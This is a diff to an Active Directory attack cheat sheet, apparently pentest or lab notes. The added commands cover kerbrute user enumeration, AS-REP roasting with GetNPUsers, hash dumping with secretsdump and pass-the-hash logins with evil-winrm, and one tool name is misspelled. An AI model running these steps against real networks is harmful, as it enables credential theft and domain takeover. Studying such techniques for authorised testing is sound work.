@@ -6,9 +6,16 @@
 
     ./kerbrute userenum userlist.txt -d [name] --dc [name]     
 
-Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set   
+Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set. Crack hashes with hashcat        
 
-    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.local/ -no-pass -usersfile users.txt     
+    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.local/ -no-pass -usersfile users.txt         
+    
+If you have creds for the backup account for domain controller: can dump all hashes (has full     
+    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup:backuppassword@domain.local
+    
+Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't neeed to be cracked)    
+
+    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]        
 
 ## Post Exploitation    
 ### PowerView   
